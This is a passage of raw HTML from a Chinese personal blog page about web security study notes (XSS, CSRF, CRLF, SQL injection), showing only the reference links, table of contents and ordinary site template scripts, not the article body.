href="https://www.cnblogs.com/xiaoheimiaoer/p/4676763.html">XSS初体验</a></li><li><a target="_blank" rel="noopener" href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet">XSS Filter Evasion Cheat Sheet</a></li><li><a target="_blank" rel="noopener" href="https://ckeditor.com/docs/ckeditor4/latest/guide/dev_best_practices.html">CKEditor Best Practices</a></li><li><a target="_blank" rel="noopener" href="https://blog.csdn.net/zcl_love_wx/article/details/51395211">深究AngularJS——$sce的使用</a></li><li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lovesong/p/5233195.html">Web安全之CSRF攻击</a></li><li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/studyskill/p/6972576.html">新浪某站CRLF Injection导致的安全问题</a></li><li><a target="_blank" rel="noopener" href="https://blog.csdn.net/lisheng19870305/article/details/50754510">固定SessionID 漏洞 攻击</a></li><li><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/news/61383">用 sql 注入攻破一个网站</a></li></ol><p><em>封面来源: <a target="_blank" rel="noopener" href="https://pixabay.com/photos/security-protection-anti-virus-265130/">pixabay</a>, free for commercial use.</em></p></div><div class="article-licensing box"><div class="licensing-title"><p>XSS, CSRF, CRLF, SQL注入学习笔记</p><p><a href="https://www.imaegoo.com/2019/web-security/">https://www.imaegoo.com/2019/web-security/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><p>iMaeGoo</p></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2019-05-24</p></div></div><div class="level-item is-narrow"><div><h6>更新于</h6><p>2019-05-27</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="" rel="noopener" target="_blank" title="CC BY 4.0" href="https://creativecommons.org/licenses/by/4.0/deed.zh">CC BY 4.0</a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/security/">security</a></div></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">喜欢这篇文章？打赏一下作者吧</h3><div class="buttons is-centered"><a class="button donate" data-type="alipay"><span class="icon is-small"><i class="fab fa-alipay"></i></span><span>支付宝</span><span class="qrcode"><img src="/images/alipay.jpg" alt="支付宝"></span></a><a class="button donate" data-type="wechat"><span class="icon is-small"><i class="fab fa-weixin"></i></span><span>微信</span><span class="qrcode"><img src="/images/wechat.png" alt="微信"></span></a></div></div></div><div class="card"><nav class="post-navigation mt-4 level is-mobile card-content"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2019/load-balancing/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">负载均衡：ELB, ALB, NLB, CLB</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2019/ajs-function-in-directive-scope/"><span class="level-item">AngularJS 给 directive scope 绑定的 function 传参</span><i class="level-item fas fa-chevron-right"></i></a></div></nav></div><div class="card" id="comments"><div class="card-content"><h3 class="title is-5">评论</h3><div class="content twikoo" id="twikoo"></div><script src="https://registry.npmmirror.com/twikoo/1.6.44/files/dist/twikoo.min.js"></script><script>twikoo.init({envId:"https://twikoo.imaegoo.com",lang:"zh-CN",onCommentLoaded:function(){for(var t=document.getElementsByClassName("tk-content"),e=0;e<t.length;e++){var n=t[e],r=n.getElementsByTagName("img");if(0<r.length){for(var i=0;i<r.length;i++){var l=r[i],a=document.createElement("a");a.setAttribute("class","tk-lg-link"),a.setAttribute("href",l.getAttribute("src")),a.setAttribute("data-src",l.getAttribute("src")),a.appendChild(l.cloneNode(!1)),l.parentNode.insertBefore(a,l.nextSibling),l.remove()}"function"==typeof $.fn.lightGallery&&$(n).lightGallery({selector:".tk-lg-link"})}handleThirdPartyLink&&handleThirdPartyLink(n)}}})</script></div></div></div><style>.column.column-left,.column.column-right{display:none}</style><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen order-1 is-sticky"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="/images/avatar.jpg" alt="iMaeGoo"></figure><p class="title is-size-4 is-block" style="line-height:inherit">iMaeGoo</p><p class="is-size-6 is-block">虹墨空间站</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>Zhengzhou, China</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives/"><p class="title">245</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories/"><p class="title">12</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags/"><p class="title">45</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/imaegoo" target="_blank" rel="me noopener" id="widget-follow">GitHub</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="哔哩哔哩" href="https://space.bilibili.com/4750943"><i class="fas fa-video"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="QQ" href="https://jq.qq.com/?_wv=1027&amp;k=2l9ZGIoL"><i class="fab fa-qq"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Mail" href="mailto:hello@imaegoo.com"><i class="fas fa-envelope"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="RSS" href="/atom.xml"><i class="fas fa-rss"></i></a></div></div></div><div class="card widget"><div class="card-content"><div class="media" style="overflow:hidden;align-items:center"><div class="media-left"><figure class="image is-96x96"><img src="/images/weixin/qrcode.jpg" alt="微信二维码"></figure></div><div class="media-content"><div id="weixin-search-logo"></div><div class="control has-icons-left" id="weixin-search-text"><input class="input" readonly="readonly" value="虹墨iMaeGoo" onfocus="this.select()"><span class="icon is-small is-left"><i class="fas fa-search"></i></span></div></div></div></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2025/"><span class="level-start"><span class="level-item">2025</span></span><span class="level-end"><span class="level-item tag">13</span></span></a></li><li><a class="level is-mobile" href="/archives/2024/"><span class="level-start"><span class="level-item">2024</span></span><span class="level-end"><span class="level-item tag">24</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/"><span class="level-start"><span class="level-item">2023</span></span><span class="level-end"><span class="level-item tag">13</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/"><span class="level-start"><span class="level-item">2022</span></span><span class="level-end"><span class="level-item tag">9</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/"><span class="level-start"><span class="level-item">2021</span></span><span class="level-end"><span class="level-item tag">16</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/"><span class="level-start"><span class="level-item">2020</span></span><span class="level-end"><span class="level-item tag">33</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/"><span class="level-start"><span class="level-item">2019</span></span><span class="level-end"><span class="level-item tag">35</span></span></a></li><li><a class="level is-mobile" href="/archives/2018/"><span class="level-start"><span class="level-item">2018</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li><li><a class="level is-mobile" href="/archives/2016/"><span class="level-start"><span class="level-item">2016</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2013/"><span class="level-start"><span class="level-item">2013</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2012/"><span class="level-start"><span class="level-item">2012</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li><li><a class="level is-mobile" href="/archives/2011/"><span class="level-start"><span class="level-item">2011</span></span><span class="level-end"><span class="level-item tag">29</span></span></a></li><li><a class="level is-mobile" href="/archives/2010/"><span class="level-start"><span class="level-item">2010</span></span><span class="level-end"><span class="level-item tag">35</span></span></a></li><li><a class="level is-mobile" href="/archives/2009/"><span class="level-start"><span class="level-item">2009</span></span><span class="level-end"><span class="level-item tag">16</span></span></a></li><li><a class="level is-mobile" href="/archives/2008/"><span class="level-start"><span class="level-item">2008</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li></ul></div></div></div><div class="column-right-shadow is-hidden-widescreen is-sticky"></div></div><div class="column column-right is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only order-3 is-sticky"><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">目录</h3><ul class="menu-list"><li><a class="level is-mobile" href="#XSS-跨站脚本"><span class="level-left"><span class="level-item">1</span><span class="level-item">XSS 跨站脚本</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#存储XSS"><span class="level-left"><span class="level-item">1.1</span><span class="level-item">存储XSS</span></span></a></li><li><a class="level is-mobile" href="#反射XSS"><span class="level-left"><span class="level-item">1.2</span><span class="level-item">反射XSS</span></span></a></li><li><a class="level is-mobile" href="#基于DOM的XSS"><span class="level-left"><span class="level-item">1.3</span><span class="level-item">基于DOM的XSS</span></span></a></li><li><a class="level is-mobile" href="#实践"><span class="level-left"><span class="level-item">1.4</span><span class="level-item">实践</span></span></a></li><li><a class="level is-mobile" href="#备用XSS语法"><span class="level-left"><span class="level-item">1.5</span><span class="level-item">备用XSS语法</span></span></a></li><li><a class="level is-mobile" href="#预防"><span class="level-left"><span class="level-item">1.6</span><span class="level-item">预防</span></span></a></li></ul></li><li><a class="level is-mobile" href="#CSRF-跨站请求伪造"><span class="level-left"><span class="level-item">2</span><span class="level-item">CSRF 跨站请求伪造</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#GET场景"><span class="level-left"><span class="level-item">2.1</span><span class="level-item">GET场景</span></span></a></li><li><a class="level is-mobile" href="#POST场景"><span class="level-left"><span class="level-item">2.2</span><span class="level-item">POST场景</span></span></a></li><li><a class="level is-mobile" href="#组合XSS实现XSRF"><span class="level-left"><span class="level-item">2.3</span><span class="level-item">组合XSS实现XSRF</span></span></a></li><li><a class="level is-mobile" href="#预防-1"><span class="level-left"><span class="level-item">2.4</span><span class="level-item">预防</span></span></a></li></ul></li><li><a class="level is-mobile" href="#CRLF-返回头拆分"><span class="level-left"><span class="level-item">3</span><span class="level-item">CRLF 返回头拆分</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#参数注入返回头"><span class="level-left"><span class="level-item">3.1</span><span class="level-item">参数注入返回头</span></span></a></li><li><a class="level is-mobile" href="#预防-2"><span class="level-left"><span class="level-item">3.2</span><span class="level-item">预防</span></span></a></li></ul></li><li><a class="level is-mobile" href="#SQL-注入"><span class="level-left"><span class="level-item">4</span><span class="level-item">SQL 注入</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#拼接注入"><span class="level-left"><span class="level-item">4.1</span><span class="level-item">拼接注入</span></span></a></li><li><a class="level is-mobile" href="#预防-3"><span class="level-left"><span class="level-item">4.2</span><span class="level-item">预防</span></span></a></li></ul></li><li><a class="level is-mobile" href="#参考文献"><span class="level-left"><span class="level-item">5</span><span class="level-item">参考文献</span></span></a></li></ul></div></div><style>#toc .menu-list>li>a.is-active+.menu-list{display:block}#toc .menu-list>li>a+.menu-list{display:none}</style><script src="/js/toc.js" defer="defer"></script></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time datetime="2025-09-02T00:00:00.000Z">2025-09-02</time></p><p class="title"><a href="/2025/uninstall-netdisk-image-viewer/">卸载百度网盘智能看图</a></p><p class="categories"><a href="/categories/tech/">Tech</a> / <a href="/categories/tech/windows/">Windows</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time datetime="2025-09-01T09:30:00.000Z">2025-09-01</time></p><p class="title"><a href="/2025/monaco-editor-cdn/">CDN 方式引入 Monaco Editor</a></p><p class="categories"><a href="/categories/tech/">Tech</a> / <a href="/categories/tech/frontend/">FrontEnd</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time datetime="2025-09-01T04:30:00.000Z">2025-09-01</time></p><p class="title"><a href="/2025/html-to-md/">在线工具 - 富文本转 Markdown</a></p><p class="categories"><a href="/categories/tool/">Tool</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time datetime="2025-08-25T04:00:00.000Z">2025-08-25</time></p><p class="title"><a href="/2025/android-pad-input-method/">2025 年了，安卓平板上什么第三方九键输入法最好用？</a></p><p class="categories"><a href="/categories/tech/">Tech</a> / <a href="/categories/tech/android/">Android</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time datetime="2025-08-25T00:00:00.000Z">2025-08-25</time></p><p class="title"><a href="/2025/harmony-pc-electron/">鸿蒙 PC 编译运行 Electron 应用</a></p><p class="categories"><a href="/categories/tech/">Tech</a> / <a href="/categories/tech/harmony/">Harmony</a></p></div></article></div></div><div class="card widget" id="twikoo-new"><div class="card-content"><div class="menu"><h3 class="menu-label">最新评论</h3><script>window.twikooEnvId="https://twikoo.imaegoo.com"</script><div class="twikoo-new-container"></div></div></div></div></div><style>.column.column-left,.column.column-right{display:block}</style></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img class="logo-img" src="/images/logo.png" alt="虹墨空间站" height="28"><img class="logo-img-dark" src="/images/logo-dark.png" alt="虹墨空间站" height="28"></a><p class="is-size-7"><span>&copy; 2025 iMaeGoo</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/imaegoo/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a><br><span id="busuanzi_container_site_uv">总访问量&nbsp;<span id="busuanzi_value_site_pv">-</span>&nbsp;次&nbsp;&nbsp;总访客数&nbsp;<span id="busuanzi_value_site_uv">-</span>&nbsp;人</span></p><p class="is-size-7"><a href="https://beian.mps.gov.cn/#/query/webSearch?code=41010502005985" rel="noreferrer" target="_blank">豫公网安备41010502005985</a>&nbsp;&nbsp;<a href="https://beian.miit.gov.cn" target="_blank" rel="noreferrer noopener">豫ICP备18017229号</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/deed.zh"><i class="fab fa-creative-commons-by"></i></a></p></div></div></div></div></footer><script src="/js/imaegoo/jquery/3.3.1/dist/jquery.min.js"></script><script src="/js/imaegoo/moment/2.22.2/min/moment-with-locales.min.js"></script><script src="https://registry.npmmirror.com/twikoo/1.6.44/files/dist/twikoo.min.js"></script><script src="/js/imaegoo/clipboard/2.0.4/dist/clipboard.min.js" defer="defer"></script><script>moment.locale("zh-cn")</script><script>var IcarusThemeSettings={article:{highlight:{clipboard:!0,fold:"unfolded"}}}</script><script data-pjax src="/js/column.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script data-pjax src="/js/back_to_top.js" defer="defer"></script><script src="/js/imaegoo/lightgallery/1.10.0/dist/js/lightgallery.min.js" defer="defer"></script><script src="/js/imaegoo/justifiedGallery/3.8.1/dist/js/jquery.justifiedGallery.min.js" defer="defer"></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><script src="/js/imaegoo/cookieconsent/3.1.1/build/cookieconsent.min.js" defer="defer"></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-right",
        content: {
          message: "此网站使用 Cookie，以启用评论系统和分析功能。",
          dismiss: "知道了",
          allow: "允许使用Cookie",
          deny: "拒绝",
          link: "了解更多",
          policy: "Cookie政策",
          href: "/cookies/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script data-pjax src="/js/main.js" defer="defer"></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><div class="searchbox-pinyin"><label class="checkbox"><input id="search-by-pinyin" type="checkbox" checked="checked"><span> 拼音检索</span></label></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/imaegoo/pinyin.js" defer="defer"></script><script src="/js/insight.js" defer="defer"></script><script>document.addEventListener("DOMContentLoaded",function(){loadInsight({contentUrl:"/content.json"},{hint:"想要查找什么...",untitled:"(无标题)",posts:"文章",pages:"页面",categories:"分类",tags:"标签"})})</script><script type="text/javascript" src="/js/imaegoo/imaegoo.js"></script><script type="text/javascript" src="/js/imaegoo/universe.js"></script></body></html>